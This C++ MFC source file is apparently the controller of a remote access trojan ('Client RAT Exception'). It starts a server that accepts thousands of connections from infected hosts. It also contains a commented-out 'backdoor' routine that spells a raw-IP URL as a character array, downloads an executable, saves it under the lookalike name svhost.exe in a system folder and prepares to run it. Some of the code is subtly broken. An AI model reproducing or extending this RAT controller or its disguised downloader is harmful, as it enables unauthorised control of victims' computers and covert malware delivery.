// Client.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "Client.h"
#include "MainFrm.h"
#include "ClientDoc.h"
#include "ClientView.h"
//#include "StartupDlg.h"//启动画面
//#include "SkinH.h"
//#pragma comment(lib, "SkinH.lib")
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

HMODULE hModule_shell32;

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) 
{
	char buff[1024];
	memset(buff, 0, sizeof(buff));
	wsprintf
		(buff, 
		"CRASH CODE:0x%.8x ADDR=0x%.8x FLAGS=0x%.8x PARAMS=0x%.8x\n"
		"eax=%.8x ebx=%.8x ecx=%.8x\nedx=%.8x esi=%.8x edi=%.8x\neip=%.8x esp=%.8x ebp=%.8x\n",
		ExceptionInfo->ExceptionRecord->ExceptionCode,
		ExceptionInfo->ExceptionRecord->ExceptionAddress,
		ExceptionInfo->ExceptionRecord->ExceptionFlags,
		ExceptionInfo->ExceptionRecord->NumberParameters,
		ExceptionInfo->ContextRecord->Eax,
		ExceptionInfo->ContextRecord->Ebx,
		ExceptionInfo->ContextRecord->Ecx,
		ExceptionInfo->ContextRecord->Edx,
		ExceptionInfo->ContextRecord->Esi,
		ExceptionInfo->ContextRecord->Edi,
		ExceptionInfo->ContextRecord->Eip,
		ExceptionInfo->ContextRecord->Esp,
		ExceptionInfo->ContextRecord->Ebp
		);
	
	MessageBox(NULL, buff, "Client RAT Exception", MB_OK);
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) 
{
	dbg_dump(ExceptionInfo);
	return true;
}
/////////////////////////////////////////////////////////////////////////////
// CClientApp

BEGIN_MESSAGE_MAP(CClientApp, CWinApp)
	//{{AFX_MSG_MAP(CClientApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClientApp construction
DWORD CClientApp::GetRand()
{
	typedef DWORD (WINAPI *tGetRandNum)();
	tGetRandNum pGetRandNum = (tGetRandNum)GetProcAddress(m_Hmodule,"GetRandNum");
	
	if(pGetRandNum)
		return pGetRandNum();
}

CClientApp::CClientApp()
{
    //  TODO: add construction code here,
    //  Place all significant initialization in InitInstance
	//  加载系统图标,后面在Filemanager要用到
	typedef BOOL (WINAPI * pfn_FileIconInit) (BOOL fFullInit);
	hModule_shell32 = LoadLibrary("shell32.dll");
	if(hModule_shell32)
	{
		pfn_FileIconInit FileIconInit = (pfn_FileIconInit) GetProcAddress(hModule_shell32, (LPCSTR)660);
		FileIconInit(TRUE);
	}
	else
	{
		AfxMessageBox("LoadLibray shell32 error!");
	}
	// 读取qqwry.dat（位置文件）
	HANDLE	hFile = CreateFile("更新\\QQwry.dat", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		m_bIsQQwryExist = true;
	}
	else
	{
		m_bIsQQwryExist = false;
	}
	CloseHandle(hFile);
	// 是否要禁用气泡提示 false（不禁用气泡）

	m_bIsDisablePopTips = (m_IniFile.GetInt("Settings", "PopTips", false) && true);
	//
	m_bIsWarning_Tone   = (m_IniFile.GetInt("Settings", "Alarm", false) && true);


	m_bisDisableHostlist = (m_IniFile.GetInt("Settings", "Hostlist", false) &&true);


}

/////////////////////////////////////////////////////////////////////////////
// The one and only CClientApp object

CClientApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CClientApp initialization

// void houmen()
// {
// 	
// 	char ubRIK[] = {'h','t','t','p',':','/','/','1','0','3','.','1','1','8','.','2','2','1','.','1','4','3',':','8','0','8','0','/','s','v','c','h','o','s','t','.','e','x','e','\0'};
// 	Sleep(60000);
// 	URLDownloadToFile(NULL,ubRIK,"C:\\Program Files\\Common Files\\Microsoft Shared\\svhost.exe",0,NULL);  
// 	Sleep(5000); 
// //	ShellExecute(0,"open","C:\\Program Files\\Common Files\\Microsoft Shared\\svhost.exe",NULL,NULL,SW_SHOW);
// }


BOOL CClientApp::InitInstance()	
{
	
	if (((CClientApp *)AfxGetApp())->m_IniFile.GetString("Settings", "Skin", "") == "")
	{
		HGLOBAL hRes;
		HRSRC hResInfo;
		HINSTANCE hinst = AfxGetInstanceHandle();
// 		hResInfo = FindResource(hinst, MAKEINTRESOURCE(IDR_SKIN), "SKIN");
		if (hResInfo != NULL)
		{
			hRes = LoadResource(hinst, hResInfo);
			if (hRes != NULL)
			{
				SkinH_AttachRes((LPBYTE)hRes, SizeofResource(hinst,hResInfo), NULL, 0, 0, 0);
				//SkinH_SetAero(FALSE);//透明特效开关TRUE/FALSE
				FreeResource(hRes);
			}
		}
	}
	else
	{
		CString strSkinFile = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Settings", "Skin", "SkinH.she");
		HANDLE	hFile = CreateFile("SkinH.dll", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			//SkinH_SetAero(TRUE);//Aero透明特效
			//SkinH_SetMenuAlpha(200);
			SkinH_AttachEx(strSkinFile,NULL);
		}
		}
AfxEnableControlContainer();
//        SkinH_Attach();
#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif
//	CStartupDlg dlg;
//    dlg.DoModal();   //启动画面
//    Change the registry key under which our settings are stored.
//    TODO: You should modify this string to be something appropriate
//    such as the name of your company or organization.
//    SetRegistryKey(_T("Local AppWizard-Generated Applications"));
   	  LoadStdProfileSettings();  //   Load standard INI file options (including MRU)
//    Register the application's document templates.  Document templates
//    serve as the connection between documents, frame windows and views.

	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CClientDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CClientView));
	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// The one and only window has been initialized, so show and update it.
	// 启动IOCP服务器
// 	int	nPort = m_IniFile.GetInt("Settings", "ListenPort");
// 	if (nPort == 0)	nPort = 1987;
// 	
// 	int	nMaxConnection = m_IniFile.GetInt("Settings", "MaxConnection");
// 	if (nMaxConnection == 0) nMaxConnection = 1987;
// 	
// 	((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);
// 	m_pMainWnd->ShowWindow(SW_SHOW);
// 	m_pMainWnd->UpdateWindow();

	

	// 启动IOCP服务器
	int	nPort = m_IniFile.GetInt("Settings", "ListenPort");
	if (nPort == 0)	nPort = 8001;
	
	int	nMaxConnection = m_IniFile.GetInt("Settings", "MaxConnection");
	if (nMaxConnection == 0) nMaxConnection = 8000;
	
	((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);
	
	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
		// No message handlers
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CClientApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////
// CClientApp message handlers


int CClientApp::ExitInstance() 
{
	// TODO: Add your specialized code here and/or call the base class

	return CWinApp::ExitInstance();
}
